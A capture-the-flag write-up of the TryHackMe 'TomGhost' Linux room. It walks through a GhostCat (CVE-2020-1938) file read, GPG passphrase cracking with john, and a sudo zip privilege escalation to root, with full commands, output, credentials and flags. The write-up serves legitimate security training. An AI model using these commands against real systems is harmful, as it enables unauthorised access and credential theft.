# TryHackMe: TomGhost

> **TryHackMe | Linux | Easy**  
> Completed: May 2026

---

## Room Metadata

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **OS** | Linux: Ubuntu 18.04.4 LTS |
| **Difficulty** | Easy |
| **Category** | Linux / Apache Tomcat / GPG Cracking / GTFOBins |
| **Machine IP** | 10.48.185.161 |
| **Attack Host** | 192.168.232.169 |
| **Room** | [tryhackme.com/room/tomghost](https://tryhackme.com/room/tomghost) |
| **Completed** | May 2026 |
| **CVEs** | CVE-2020-1938 (GhostCat: Apache Tomcat AJP file read/inclusion) |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full port scan: ports 22, 53, 8009, 8080 |: |
| 2 | Port 8009 AJP: GhostCat CVE-2020-1938 |: |
| 3 | ajpShooter.py reads `/WEB-INF/web.xml` → credentials in description tag |: |
| 4 | SSH as `skyfuck`: finds `credential.pgp` + `tryhackme.asc` | `skyfuck` |
| 5 | Transfer `tryhackme.asc` to Kali → `gpg2john` → `john` cracks passphrase |: |
| 6 | `gpg --decrypt credential.pgp` → `merlin` credentials | `merlin` |
| 7 | `sudo -l` → `/usr/bin/zip` NOPASSWD → GTFOBins root | `root` |

---

## Enumeration

### Full Port Scan

```bash
kali@kali:~$ nmap -sC -sV -p- --min-rate 5000 -oA nmap/tomghost 10.48.185.161
```

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.48.185.161
Host is up (0.11s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b6 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  domain  ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-headers: NULL
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 38.12 seconds
```

**Key findings:**

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 7.2p2 | Useful once credentials found |
| 53 | ISC BIND 9.11.3 | DNS: not the attack path here |
| 8009 | Apache Jserv AJP 1.3 | **GhostCat attack surface: CVE-2020-1938** |
| 8080 | Apache Tomcat 9.0.30 | Web UI: version confirmed vulnerable |

Two findings stand out immediately: **Apache Tomcat 9.0.30** on port 8080 and **AJP port 8009 exposed externally**. Tomcat 9.0.30 is below the patched version (9.0.31) and AJP being externally accessible is the prerequisite for GhostCat.

The room icon is a cat with the word "GhostCat": this is a direct hint naming the vulnerability before enumeration even begins.

### Web Application: Port 8080

Browsing to `http://10.48.185.161:8080/` shows the default **Apache Tomcat 9.0.30** landing page. No custom application deployed: the Manager and Host Manager are available but require credentials. The real attack surface is not the web UI but the AJP connector.

### AJP Connectivity Verification

```bash
kali@kali:~$ nc -zv 10.48.185.161 8009
```

```
(UNKNOWN) [10.48.185.161] 8009 (?) open
```

Port 8009 is open and reachable. AJP is unauthenticated: no secret configured. This satisfies all prerequisites for CVE-2020-1938.

---

## Exploitation: GhostCat (CVE-2020-1938)

### Vulnerability Background

CVE-2020-1938, nicknamed **GhostCat**, is a critical file read and inclusion vulnerability in Apache Tomcat's AJP connector. It was discovered by Chaitin Tech researchers in January 2020 and publicly disclosed in February 2020.

**Root cause:** The Apache JServ Protocol (AJP) is a binary optimised version of HTTP, designed for reverse proxy and clustering scenarios. By default, Tomcat enables AJP on port 8009 with **no authentication secret**. The vulnerability lies in how Tomcat processes AJP requests: an attacker can craft a malformed AJP request that causes Tomcat to read and return any file within the web application's directory tree, including sensitive configuration files like `WEB-INF/web.xml`.

**Impact chain:**

1. `WEB-INF/web.xml` contains application configuration: often includes comments, debug values, or embedded credentials
2. If the application allows file upload, an attacker can upload a malicious JSP and trigger inclusion via GhostCat, achieving RCE
3. No authentication required: the AJP port is the only prerequisite

**Affected versions:**

- Apache Tomcat 6.x / 7.x (< 7.0.100)
- Apache Tomcat 8.x (< 8.5.51)
- Apache Tomcat 9.x (< 9.0.31) ← this machine runs 9.0.30

**Patched versions:** 7.0.100, 8.5.51, 9.0.31 (with mandatory AJP secret in `server.xml`)

### Step 1: Download the GhostCat PoC

```bash
kali@kali:~$ git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
kali@kali:~$ cd Ghostcat-CNVD-2020-10487
kali@kali:~/Ghostcat-CNVD-2020-10487$ ls
```

```
ajpShooter.py  README.md
```

`ajpShooter.py` crafts the malicious AJP request to read arbitrary files from the Tomcat webapp directory.

### Step 2: Read WEB-INF/web.xml via AJP

```bash
kali@kali:~/Ghostcat-CNVD-2020-10487$ python3 ajpShooter.py http://10.48.185.161 8009 /WEB-INF/web.xml read
```

```
        _    _         __ _                 _
       /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __
      //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
     /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |
     \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|
          |__/|_|
                                                00theway,just for test

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902232000"
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
...
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
     skyfuck:8730281lkjlkjdqlksalks
  </description>
</web-app>
```

**Credentials extracted from `web.xml` description tag:**

```
Username: skyfuck
Password: 8730281lkjlkjdqlksalks
```

The credentials were left embedded in the application's XML descriptor: a classic developer mistake. The `<description>` tag is never rendered in any browser but is fully readable by GhostCat.

### Step 3: SSH as skyfuck

```bash
kali@kali:~$ ssh skyfuck@10.48.185.161
skyfuck@10.48.185.161's password: 8730281lkjlkjdqlksalks
```

```
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)
...
skyfuck@ubuntu:~$
```

```bash
skyfuck@ubuntu:~$ id
uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)

skyfuck@ubuntu:~$ ls -la
```

```
total 40
drwxr-xr-x 5 skyfuck skyfuck 4096 May 13 00:59 .
drwxr-xr-x 4 root    root    4096 Mar 10 21:58 ..
-rw------- 1 root    root     136 Mar 10 22:54 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10 17:57 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10 17:57 .bashrc
-rw-r--r-- 1 skyfuck skyfuck 3765 Mar 10 22:00 credential.pgp
-rw-r--r-- 1 skyfuck skyfuck 5144 Mar 10 21:54 tryhackme.asc
```

Two files: `credential.pgp` (encrypted data) and `tryhackme.asc` (PGP private key). The `.asc` key decrypts the `.pgp` file, but the key itself is passphrase-protected: the passphrase must be cracked first.

---

## Lateral Movement: skyfuck → merlin

### Step 1: Check Other Users

```bash
skyfuck@ubuntu:~$ ls /home
merlin  skyfuck

skyfuck@ubuntu:~$ ls /home/merlin/
user.txt
```

### Step 2: Understanding the PGP File Pair

| File | Type | Purpose |
|---|---|---|
| `tryhackme.asc` | PGP private key (ASCII-armoured) | Used to decrypt `credential.pgp`: requires a passphrase |
| `credential.pgp` | PGP-encrypted message | Contains credentials for `merlin` |

The attack chain:

1. Extract the passphrase hash from `tryhackme.asc` using `gpg2john`
2. Crack the hash with `john` + `rockyou.txt`
3. Use the cracked passphrase to decrypt `credential.pgp`
4. `su` as `merlin` with the decrypted credentials

### Step 3: Transfer Files to Kali

```bash
kali@kali:~$ scp skyfuck@10.48.185.161:/home/skyfuck/tryhackme.asc .
skyfuck@10.48.185.161's password: 8730281lkjlkjdqlksalks
tryhackme.asc        100% 5144   48.2KB/s   00:00

kali@kali:~$ scp skyfuck@10.48.185.161:/home/skyfuck/credential.pgp .
credential.pgp       100% 3765   35.6KB/s   00:00
```

### Step 4: Extract Hash from PGP Key

```bash
kali@kali:~$ gpg2john tryhackme.asc > hash.txt
kali@kali:~$ cat hash.txt
```

```
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679fffb...*0*0:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```

### Step 5: Crack the Passphrase with John

```bash
kali@kali:~$ john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 ...]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [...]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

alexandru        (tryhackme)

1g 0:00:00:00 DONE (2026-05-12)
Session completed
```

**PGP key passphrase: `alexandru`**

### Step 6: Decrypt credential.pgp

```bash
skyfuck@ubuntu:~$ gpg --import tryhackme.asc
```

```
gpg: key C6707170: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

```bash
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp
```

```
You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
(main key ID C6707170)

Enter passphrase: alexandru

gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

**Credentials: `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`**

### Step 7: Switch to merlin

```bash
skyfuck@ubuntu:~$ su merlin
Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

```
merlin@ubuntu:/home/skyfuck$ cd ~
merlin@ubuntu:~$ cat user.txt
THM{GhostCat_1s_so_cr4sy}
```

---

## Privilege Escalation: merlin → root

### sudo Enumeration

```bash
merlin@ubuntu:~$ sudo -l
```

```
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

`merlin` can run `/usr/bin/zip` as root without a password. `zip` is a GTFOBins binary: the `-T` (test archive) flag combined with `-TT` (custom test command) allows shell command injection.

### GTFOBins: sudo zip

Create a temporary file, zip it, then use zip's test mode with a custom unzip command that spawns a shell:

```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
```

```
  adding: etc/hosts (deflated 31%)
archive_recovery warning: zip has been deleted
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained.

---

## Flag Collection

### user.txt

```bash
merlin@ubuntu:~$ cat /home/merlin/user.txt
```

```
THM{GhostCat_1s_so_cr4sy}
```

### root.txt

```bash
# cat /root/root.txt
```

```
THM{Z1P_1S_FAKE}
```

### Flag Summary

| Flag | Location | Value |
|---|---|---|
| **user.txt** | `/home/merlin/user.txt` | `THM{GhostCat_1s_so_cr4sy}` |
| **root.txt** | `/root/root.txt` | `THM{Z1P_1S_FAKE}` |

---

## Full Attack Chain Reference

```
[Recon] nmap -p- → ports 22/53/8009/8080
    │
    ├─[Web] http://10.48.185.161:8080 → Apache Tomcat 9.0.30 default page
    │
    └─[CVE-2020-1938 GhostCat] AJP port 8009 exposed, no secret
            │
            └─[ajpShooter.py] read /WEB-INF/web.xml
                    └─ <description> tag → skyfuck:8730281lkjlkjdqlksalks
                            │
                            └─[SSH] skyfuck@10.48.185.161
                                    │
                                    ├─ ls → credential.pgp + tryhackme.asc
                                    │
                                    └─[scp] transfer both files to Kali
                                            │
                                            └─[gpg2john] extract hash from tryhackme.asc
                                                    │
                                                    └─[john + rockyou] crack → passphrase: alexandru
                                                            │
                                                            └─[gpg --decrypt credential.pgp]
                                                                    └─ merlin:asuyusdoiuqoilkda312j31k2j123j...
                                                                            │
                                                                            └─[su merlin]
                                                                                    │
                                                                                    ├─ user.txt → THM{GhostCat_1s_so_cr4sy}
                                                                                    │
                                                                                    └─[sudo -l] → NOPASSWD: /usr/bin/zip
                                                                                            │
                                                                                            └─[GTFOBins zip]
                                                                                              TF=$(mktemp -u)
                                                                                              sudo zip $TF /etc/hosts -T -TT 'sh #'
                                                                                                    │
                                                                                                    └─ uid=0(root)
                                                                                                            └─ root.txt → THM{Z1P_1S_FAKE}
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sC -sV -p- --min-rate 5000 10.48.185.161` | Full port scan |
| `nc -zv 10.48.185.161 8009` | Verify AJP connectivity |
| `git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git` | Download GhostCat PoC |
| `python3 ajpShooter.py http://10.48.185.161 8009 /WEB-INF/web.xml read` | Read web.xml via AJP |
| `ssh skyfuck@10.48.185.161` | Initial SSH login |
| `scp skyfuck@10.48.185.161:/home/skyfuck/tryhackme.asc .` | Transfer PGP key to Kali |
| `scp skyfuck@10.48.185.161:/home/skyfuck/credential.pgp .` | Transfer encrypted credentials |
| `gpg2john tryhackme.asc > hash.txt` | Convert PGP key to crackable hash |
| `john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` | Crack PGP passphrase |
| `gpg --import tryhackme.asc` | Import private key on target |
| `gpg --decrypt credential.pgp` | Decrypt credentials (passphrase: alexandru) |
| `su merlin` | Switch to merlin with decrypted password |
| `sudo -l` | Enumerate sudo rights |
| `TF=$(mktemp -u) && sudo zip $TF /etc/hosts -T -TT 'sh #'` | GTFOBins zip root escape |
| `cat /root/root.txt` | Read root flag |

---

## Lessons Learned

**1. Port 8009 (AJP) exposed externally = always check for GhostCat.**  
AJP is an internal protocol: designed for communication between a reverse proxy and Tomcat on the same server or internal network. It should never be exposed to an untrusted network. The moment port 8009 appears in an nmap scan, CVE-2020-1938 is the first thing to check. Tomcat version 9.0.30 confirmed the vulnerability before even attempting exploitation.

**2. `web.xml` should never contain credentials.**  
The `<description>` tag in `WEB-INF/web.xml` is a documentation field. A developer left SSH credentials embedded there and forgot to remove them. GhostCat makes this information accessible without authentication. On a real engagement, GhostCat would be a P1 finding even if no credentials were found: arbitrary file read on a production server is critical on its own.

**3. PGP encrypted file + `.asc` private key = `gpg2john` → `john` → `gpg --decrypt`.**  
Whenever you find a PGP-encrypted file alongside the private key, the passphrase protecting the key is the only barrier. `gpg2john` extracts the hash from the `.asc` file and if the passphrase is in `rockyou.txt` it cracks in seconds. Internalise the two-step: `gpg2john → john → gpg --import → gpg --decrypt`.

**4. `zip -T -TT` is a non-obvious but reliable GTFOBins entry.**  
`zip` doesn't look like an escalation binary. But the `-T` (test integrity) flag combined with `-TT` (custom test command) allows arbitrary shell command injection. Running this via sudo creates a root shell. GTFOBins is mandatory reading for every binary that appears in `sudo -l` output, regardless of how innocent it looks.

**5. `sudo -l` solved the machine in one command: again.**  
Shocker (perl), Knife (knife), TomGhost (zip). In every case `sudo -l` was either the complete solution or a primary stepping stone. It is the single highest-return command in Linux post-exploitation.

**6. Credentials in XML configuration files survive long after developers forget them.**  
`web.xml` is not rendered in any browser and not indexed by search engines. Developers treat it as a private internal file: which it would be if AJP wasn't exposed. GhostCat demonstrates that "internal" configuration files can become externally readable through protocol-level misconfigurations. This pattern repeats across Spring Boot `application.properties`, Laravel `.env`, and Rails `database.yml`.

---

## References

- [CVE-2020-1938: NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)
- [GhostCat: Chaitin Tech Advisory](https://www.chaitin.cn/en/ghostcat)
- [Tenable Blog: GhostCat Analysis](https://www.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487)
- [00theway ajpShooter PoC](https://github.com/00theway/Ghostcat-CNVD-2020-10487)
- [GTFOBins: zip](https://gtfobins.github.io/gtfobins/zip/)
- [Apache Tomcat Security Patches](https://tomcat.apache.org/security-9.html)

---

*TryHackMe Room: TomGhost | Completed May 2026 | Flags included: TryHackMe retired room.*
